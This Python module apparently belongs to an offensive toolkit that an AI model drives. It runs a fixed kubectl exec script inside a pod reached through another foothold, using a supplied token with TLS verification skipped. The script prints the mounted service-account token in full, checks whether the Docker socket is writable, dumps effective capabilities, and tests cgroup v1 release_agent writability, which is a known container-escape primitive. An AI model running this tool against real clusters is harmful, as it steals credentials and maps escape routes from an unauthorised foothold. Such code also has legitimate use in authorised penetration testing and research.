"""
Subprocess execution for pod_exec_enum: one ``kubectl exec`` into a pod
already reached via some other foothold (e.g. RCE in a web app
container), running one fixed, bounded, read-only POSIX-sh script inside
the container. No parsing logic here -- see parse.py.

The script checks four container-isolation misconfiguration indicators
and prints them as marker-delimited blocks:

  * sa_token       -- the mounted service-account token and namespace
    file, if any. The token is printed in full: it is a legitimate
    credential a real engagement would pivot with next.
  * docker_socket  -- whether /var/run/docker.sock exists and is
    writable by the current user.
  * capabilities   -- the raw CapEff bitmask from /proc/self/status
    (decoded into capability names by parse.py, not here).
  * cgroup_release_agent -- whether the host is on cgroup v1 (v2's
    unified hierarchy has no per-controller release_agent file) and, if
    so, whether CGROUP_CONTROLLERS' release_agent file is writable --
    the classic cgroup v1 release_agent container-escape primitive
    (writing a host command into it runs on the host once the cgroup's
    last process exits). Only checks writability; never writes to it.

Nothing model-chosen is interpolated into the script. The only
model-supplied values go into kubectl argv as validated flag values,
never into the script text. The script performs no writes, deletes,
or permission changes.
"""
from __future__ import annotations

import re
import shutil
import subprocess
from typing import List, Optional

from tradecraft.adapters.kubectl import parse as k8s_parse
from tradecraft.adapters.pod_exec_enum import parse as pee_parse

DEFAULT_TIMEOUT = 60

# DNS-1123 label (namespace, container name) and subdomain (pod name).
# Same patterns as kubectl_exploit's execute.py. Validating these keeps a
# model-supplied value from being read as a kubectl flag.
_NAMESPACE_RE = re.compile(r"^[a-z0-9]([-a-z0-9]{0,61}[a-z0-9])?$")
_CONTAINER_RE = _NAMESPACE_RE
_POD_RE = re.compile(r"^[a-z0-9]([-a-z0-9.]{0,251}[a-z0-9])?$")

SA_DIR = "/var/run/secrets/kubernetes.io/serviceaccount"
DOCKER_SOCKET = "/var/run/docker.sock"
TOKEN_MAX_BYTES = 65_536
# Fixed, bounded list of cgroup v1 controllers to check -- not an
# open-ended enumeration of every mounted controller.
CGROUP_V2_MARKER = "/sys/fs/cgroup/cgroup.controllers"
CGROUP_CONTROLLERS: tuple[str, ...] = ("memory", "pids")

# Fixed remote script. Plain POSIX sh; `head -c`, `wc -c`, `tr`, `sed`
# and `grep` are all available in busybox as well as GNU userland.
REMOTE_SCRIPT = "\n".join(
    [
        "LC_ALL=C",
        "export LC_ALL",
        f'SA="{SA_DIR}"',
        f'echo "{pee_parse.BEGIN_PREFIX} sa_token"',
        'if [ ! -e "$SA/token" ]; then',
        '  echo "token_file absent"',
        'elif [ ! -f "$SA/token" ] || [ ! -r "$SA/token" ]; then',
        '  echo "token_file unreadable"',
        "else",
        '  echo "token_file present"',
        '  echo "token_size_bytes $(wc -c < "$SA/token" | tr -d \' \')"',
        f'  echo "{pee_parse.TOKEN_BEGIN}"',
        f'  head -c {TOKEN_MAX_BYTES} "$SA/token"',
        '  printf "\\n"',
        f'  echo "{pee_parse.TOKEN_END}"',
        "fi",
        'if [ ! -e "$SA/namespace" ]; then',
        '  echo "namespace_file absent"',
        'elif [ ! -f "$SA/namespace" ] || [ ! -r "$SA/namespace" ]; then',
        '  echo "namespace_file unreadable"',
        "else",
        '  echo "namespace_file present"',
        '  echo "namespace_value $(head -n 1 "$SA/namespace" | tr -d \'\\r\')"',
        "fi",
        f'echo "{pee_parse.END_PREFIX} sa_token"',
        f'echo "{pee_parse.BEGIN_PREFIX} docker_socket"',
        f'if [ -e "{DOCKER_SOCKET}" ]; then',
        '  echo "socket present"',
        f'  if [ -w "{DOCKER_SOCKET}" ]; then',
        '    echo "writable yes"',
        "  else",
        '    echo "writable no"',
        "  fi",
        "else",
        '  echo "socket absent"',
        "fi",
        f'echo "{pee_parse.END_PREFIX} docker_socket"',
        f'echo "{pee_parse.BEGIN_PREFIX} capabilities"',
        "capeff=$(sed -n 's/^CapEff:[[:space:]]*//p' /proc/self/status 2>/dev/null | head -n 1)",
        'if [ -n "$capeff" ]; then',
        '  echo "capeff $capeff"',
        "else",
        '  echo "capeff unavailable"',
        "fi",
        f'echo "{pee_parse.END_PREFIX} capabilities"',
        f'echo "{pee_parse.BEGIN_PREFIX} cgroup_release_agent"',
        f'if [ -e "{CGROUP_V2_MARKER}" ]; then',
        '  echo "cgroup_version v2"',
        "else",
        '  echo "cgroup_version v1"',
    ]
    + [
        line
        for ctrl in CGROUP_CONTROLLERS
        for line in (
            f'  path="/sys/fs/cgroup/{ctrl}/release_agent"',
            '  if [ ! -e "$path" ]; then',
            f'    echo "{ctrl}_release_agent absent"',
            '  elif [ -w "$path" ]; then',
            f'    echo "{ctrl}_release_agent writable"',
            "  else",
            f'    echo "{ctrl}_release_agent not_writable"',
            "  fi",
        )
    ]
    + [
        "fi",
        f'echo "{pee_parse.END_PREFIX} cgroup_release_agent"',
        f"echo {pee_parse.DONE_MARKER}",
    ]
) + "\n"


def find_kubectl_binary() -> Optional[str]:
    """Finds kubectl binary on PATH."""
    return shutil.which("kubectl")


def build_argv(
    endpoint: str,
    token: str,
    namespace: str,
    pod: str,
    container: str = "",
    binary: str = "kubectl",
) -> List[str]:
    """Builds argv for one ``kubectl exec`` running the fixed script."""
    argv = [binary, "exec", pod, "-n", namespace]
    if container:
        argv += ["-c", container]
    argv += [
        f"--server=https://{endpoint}",
        f"--token={token}",
        "--insecure-skip-tls-verify",
        "--",
        "sh",
        "-c",
        REMOTE_SCRIPT,
    ]
    return argv


def _run(argv: List[str], timeout: int, runner) -> subprocess.CompletedProcess:
    return runner(
        argv,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def execute(
    server: str,
    token: str,
    namespace: str,
    pod: str,
    container: str = "",
    timeout: Optional[int] = None,
    runner=None,
) -> pee_parse.RawPodExecResult:
    """Runs exactly one fixed enumeration script inside one pod."""
    endpoint = k8s_parse.parse_target_endpoint(server or "")
    if not endpoint:
        return pee_parse.RawPodExecResult(error="empty server parameter")
    if not token or not token.strip():
        return pee_parse.RawPodExecResult(
            server=endpoint, error="missing required token parameter"
        )

    ns = (namespace or "").strip()
    if not _NAMESPACE_RE.match(ns):
        return pee_parse.RawPodExecResult(server=endpoint, error="invalid namespace parameter")

    pod_name = (pod or "").strip()
    if not _POD_RE.match(pod_name):
        return pee_parse.RawPodExecResult(server=endpoint, error="invalid pod parameter")

    container_name = (container or "").strip()
    if container_name and not _CONTAINER_RE.match(container_name):
        return pee_parse.RawPodExecResult(server=endpoint, error="invalid container parameter")

    binary = find_kubectl_binary()
    if binary is None:
        return pee_parse.RawPodExecResult(
            server=endpoint, namespace=ns, pod=pod_name, error="kubectl binary not found on PATH"
        )

    if timeout is None:
        timeout = DEFAULT_TIMEOUT

    argv = build_argv(
        endpoint=endpoint,
        token=token.strip(),
        namespace=ns,
        pod=pod_name,
        container=container_name,
        binary=binary,
    )
    run_cmd = runner or subprocess.run

    try:
        proc = _run(argv, timeout, run_cmd)
    except subprocess.TimeoutExpired:
        return pee_parse.RawPodExecResult(
            server=endpoint,
            namespace=ns,
            pod=pod_name,
            container=container_name,
            error=f"kubectl exec timed out after {timeout}s",
        )
    except Exception as exc:  # noqa: BLE001 - surfaced to the model as a tool error
        return pee_parse.RawPodExecResult(
            server=endpoint,
            namespace=ns,
            pod=pod_name,
            container=container_name,
            error=f"kubectl exec failed: {exc}",
        )

    return pee_parse.RawPodExecResult(
        server=endpoint,
        namespace=ns,
        pod=pod_name,
        container=container_name,
        stdout=proc.stdout or "",
        stderr=proc.stderr or "",
        returncode=proc.returncode,
    )
